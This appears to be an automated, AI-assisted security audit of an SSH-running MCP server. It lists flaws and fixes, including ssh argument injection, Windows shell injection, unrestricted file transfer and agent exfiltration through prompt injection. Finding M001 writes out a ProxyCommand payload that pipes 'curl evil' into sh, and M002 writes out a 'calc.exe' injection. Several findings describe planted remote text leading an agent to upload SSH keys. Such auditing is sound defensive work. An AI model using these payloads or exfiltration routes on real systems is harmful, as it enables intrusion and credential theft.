# Agent & MCP security report

Scanned: `/tmp/blind/c36` · 2026-11-23T20:51:46+00:00 · auditor v1.0.0 · mode: reviewed

## Verdict: 🔴 Fix before shipping

| Critical | High | Medium | Low | Info | Dismissed as false alarm | Needs context |
|---|---|---|---|---|---|---|
| 3 | 2 | 0 | 2 | 0 | 0 | 0 |

## What was checked

- MCP servers in config files: **0** · tools found in code: **7** · agent/MCP code files: **1** · agent instruction files: **1**
- Frameworks seen: mcp, modelcontextprotocol

## Findings

### M001 · CRITICAL · hostAlias passed to ssh/scp as a positional with no `--` - `-oProxyCommand=` runs local commands
`None:None` · ASI02 Tool Misuse and Exploitation

hostAlias comes straight from the tool arguments (runRemoteCommand, checkConnectivity, runCommandBatch) and is placed before the command with no `--` and no check for a leading `-`; hostAlias `-oProxyCommand=sh -c 'curl evil|sh'` makes ssh execute that command on the MCP host itself, not on a remote server. The same applies to scp in uploadFile/downloadFile (line 449/466) where `${hostAlias}:${remotePath}` and localPath can also start with `-o`.
> `server.mjs:679` — `args.hostAlias,`
> `server.mjs:357` — `const child = this._spawn('ssh', ['-o', 'StrictHostKeyChecking=accept-new', hostAlias, command], spawnOptions);`

**Fix:** Reject hostAlias/localPath values starting with '-' and validate hostAlias against ^[A-Za-z0-9._@-]+$ with no leading '-' (ideally restrict to aliases from listKnownHosts); insert '--' before the destination: ['-o','StrictHostKeyChecking=accept-new','--',hostAlias,command] and the same for scp.

### M002 · CRITICAL · On Windows every ssh/scp call runs through cmd.exe (shell: true) with tool arguments
`None:None` · ASI05 Unexpected Code Execution

With shell: true Node joins the argument array into one cmd.exe command line without escaping, so on Windows a command/hostAlias/path like `x & calc.exe` (or `"& powershell ...`) executes locally on the user's machine instead of being sent to the remote host. uploadFile/downloadFile do the same via execFile with options.shell = true (lines 446/463).
> `server.mjs:680` — `args.command,`
> `server.mjs:347` — `spawnOptions.shell = true;`
> `server.mjs:357` — `const child = this._spawn('ssh', ['-o', 'StrictHostKeyChecking=accept-new', hostAlias, command], spawnOptions);`

**Fix:** Drop shell: true; resolve ssh.exe/scp.exe to a full path (e.g. via where.exe once at start-up) and call spawn/execFile without a shell.

### M003 · CRITICAL · uploadFile/downloadFile read and write any local path chosen by the model
`None:None` · ASI02 Tool Misuse and Exploitation

localPath is unrestricted and hostAlias can be any host (unknown keys are auto-accepted), so an injected call can upload ~/.ssh/id_ed25519 or cloud credentials to an attacker host, or download an attacker file over ~/.bashrc or ~/.ssh/authorized_keys for code execution.
> `server.mjs:705` — `args.localPath,`
> `server.mjs:449` — `await this._execFileAsync('scp', ['-o', 'StrictHostKeyChecking=accept-new', localPath, `${hostAlias}:${remotePath}`], options);`
> `server.mjs:466` — `await this._execFileAsync('scp', ['-o', 'StrictHostKeyChecking=accept-new', `${hostAlias}:${remotePath}`, localPath], options);`

**Fix:** Confine localPath to a configured transfer directory (fs.realpath then path.relative must not start with '..'), refuse overwriting existing files unless confirmed, and restrict hostAlias to hosts from ~/.ssh/config.

### M004 · HIGH · Arbitrary remote shell commands on any SSH host with no approval step
`None:None` · ASI02 Tool Misuse / ASI05

Running commands is the tool's purpose, but any prompt injection can run destructive commands on every host the user's keys/passwords reach (runCommandBatch loops over unlimited commands) and the server has no allowlist, read-only mode or confirmation.
> `server.mjs:538` — `description: "Executes a shell command on an SSH host. For long-running commands, increase the timeout parameter.",`
> `server.mjs:480` — `const result = await this.runRemoteCommand(hostAlias, command);`

**Fix:** Document that clients must never auto-approve these tools; add an optional host allowlist and a command allow/deny policy or read-only mode via env config.

### M005 · HIGH · Untrusted remote output + local private files + network egress in one server
`None:None` · ASI01 / ASI02 (untrusted input + private data + way out)

Command output from remote hosts (logs, files, web content fetched via curl) is returned unmarked to the model, and the same server can read any local file and send it to any host, so text planted on one server can make the agent exfiltrate local secrets without approval.
> `server.mjs:684` — `content: [{ type: "text", text: JSON.stringify(result, null, 2) }],`
> `server.mjs:588` — `description: "Uploads a local file to an SSH host",`

**Fix:** Mark remote output as untrusted data, restrict uploads to a sandbox directory and allowlisted hosts, and require human approval for uploadFile/downloadFile.

### M006 · LOW · Unknown host keys auto-accepted for any model-chosen host
`None:None` · ASI03 Identity and Privilege Abuse

accept-new silently trusts first-seen hosts, so the model can connect to any new host (attacker-controlled or spoofed on first use) and send credentials/passwords from @password via SSH_ASKPASS to it.
> `server.mjs:357` — `const child = this._spawn('ssh', ['-o', 'StrictHostKeyChecking=accept-new', hostAlias, command], spawnOptions);`

**Fix:** Only allow hosts already in ~/.ssh/config or known_hosts, or make accept-new opt-in.

### M007 · LOW · Askpass helper written to a predictable path in the shared temp dir
`None:None` · 

On multi-user systems another user can pre-create or symlink /tmp/mcp-ssh-askpass-<pid>.sh (pid is guessable) so writeFile follows it or the script is later swapped, and ssh then executes the attacker's script with the password in the environment.
> `server.mjs:296` — `scriptPath = join(tmpdir(), `mcp-ssh-askpass-${process.pid}.sh`);`
> `server.mjs:297` — `await writeFile(scriptPath, '#!/bin/sh\necho "$MCP_SSH_PASS"\n');`

**Fix:** Create the helper inside fs.mkdtemp() (0700 directory) and open it with flag 'wx' and mode 0o700.

## Limits

- Static review: the auditor reads code and configs; it does not run servers or attack them. Logic bugs, auth flaws in other services and runtime behaviour can be missed.
- Tool descriptions are checked as written in the code or a tools/list export; a remote server can return different text at runtime (use `pin --check` on exported tools.json).
- AI-assisted: findings are judged by an AI agent with every quote verified against the code; a human should confirm critical fixes.
